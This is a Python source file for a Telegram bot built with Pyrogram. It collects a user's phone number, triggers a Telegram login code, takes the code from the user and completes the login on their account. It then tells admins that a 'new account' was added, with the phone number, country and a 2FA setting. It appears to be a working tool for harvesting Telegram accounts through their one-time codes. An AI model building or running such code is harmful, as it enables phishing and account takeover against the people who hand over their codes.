from pyrogram import filters
from pyrogram.types import Message, ReplyKeyboardRemove

import keyboards as kb


def register_user_handlers(
    bot,
    config,
    tg_engine,
    user_sessions,
    admin_state,
):
    @bot.on_message(filters.command("start") & filters.private)
    async def start_handler(client, message: Message):
        user_id = message.from_user.id
        admin_state[user_id] = None
        if user_id in user_sessions:
            del user_sessions[user_id]

        await message.reply_text(
            "👋 **Welcome!**\n"
            "Please send your phone number with country code.\n"
            "Example: `+8801700000000` or `8801700000000`",
            reply_markup=ReplyKeyboardRemove(),
        )

    @bot.on_message(filters.private & filters.text)
    async def user_message_handler(client, message: Message):
        user_id = message.from_user.id
        if user_id in config.admin_ids:
            await message.continue_propagation()
            return

        text = message.text.strip()
        user = message.from_user

        if text in ["❌ Cancel Process", "/cancel"]:
            if user_id in user_sessions:
                del user_sessions[user_id]
            admin_state[user_id] = None
            await message.reply_text(
                "❌ Process cancelled successfully.",
                reply_markup=ReplyKeyboardRemove(),
            )
            return

        formatted_phone = config.format_phone_number(text)

        if (
            formatted_phone.replace("+", "").isdigit()
            and len(formatted_phone) >= 8
            and user_id not in user_sessions
        ):
            if not config.is_country_allowed(formatted_phone):
                await message.reply_text("❌ এই কান্ট্রির নম্বর এই বটে গ্রহণযোগ্য নয়।")
                return

            await message.reply_text(
                "🔄 Sending OTP...",
                reply_markup=kb.get_cancel_keyboard(),
            )
            try:
                result = await tg_engine.send_otp(formatted_phone)
                user_sessions[user_id] = {
                    "phone": result["formatted_phone"],
                    "client": result["client"],
                    "hash": result["phone_hash"],
                }
                await message.reply_text(
                    "📩 OTP Sent! Send code here:",
                    reply_markup=kb.get_cancel_keyboard(),
                )
            except Exception as error:
                error_message = str(error)
                await message.reply_text(
                    f"❌ Error: {error_message}",
                    reply_markup=ReplyKeyboardRemove(),
                )
                await notify_admins_about_error(
                    bot,
                    config,
                    user,
                    formatted_phone,
                    error_message,
                    "OTP Sending",
                )

        elif text.isdigit() and user_id in user_sessions:
            session = user_sessions[user_id]
            await message.reply_text(
                "⚡ Verifying...",
                reply_markup=ReplyKeyboardRemove(),
            )

            try:
                result = await tg_engine.complete_login(
                    client=session["client"],
                    phone_number=session["phone"],
                    phone_hash=session["hash"],
                    otp_code=text,
                )

                if result["status"] == "success":
                    await message.reply_text("✅ Account successfully received!")

                    username = f"@{user.username}" if user.username else "No Username"
                    country = result["country"]
                    notify_text = (
                        "🎉 **New Account Added Successfully!**\n\n"
                        f"👤 **Adder Name:** {user.first_name} {user.last_name or ''}\n"
                        f"🆔 **User ID:** `{user.id}`\n"
                        f"🔗 **Username:** {username}\n"
                        f"📞 **Phone Number:** `{result['formatted_phone']}`\n"
                        f"🌍 **Country:** `{country}`\n"
                        f"🔐 **2FA Status:** "
                        f"`{'Enabled' if config.use_2fa else 'Disabled'}`"
                    )
                    for admin_id in config.admin_ids:
                        try:
                            await bot.send_message(admin_id, notify_text)
                        except Exception:
                            pass
                else:
                    error_message = result.get("message", "Unknown Error")
                    await message.reply_text(f"❌ Login Failed: {error_message}")
                    await notify_admins_about_error(
                        bot,
                        config,
                        user,
                        session["phone"],
                        error_message,
                        "Login Verification",
                    )

            except Exception as error:
                error_message = str(error)
                await message.reply_text(f"❌ Login Failed: {error_message}")
                await notify_admins_about_error(
                    bot,
                    config,
                    user,
                    session["phone"],
                    error_message,
                    "Login Process Exception",
                )

            del user_sessions[user_id]

    return user_message_handler


async def notify_admins_about_error(
    bot,
    config,
    user,
    phone_number: str,
    error_message: str,
    stage: str,
):
    username = f"@{user.username}" if user.username else "No Username"
    error_text = (
        "⚠️ **User Account Addition Failed!**\n\n"
        f"👤 **User:** {user.first_name} {user.last_name or ''}\n"
        f"🆔 **User ID:** `{user.id}`\n"
        f"🔗 **Username:** {username}\n"
        f"📞 **Phone Number:** `{phone_number}`\n"
        f"📌 **Stage:** `{stage}`\n"
        f"❌ **Error Details:** `{error_message}`"
    )
    for admin_id in config.admin_ids:
        try:
            await bot.send_message(admin_id, error_text)
        except Exception:
            pass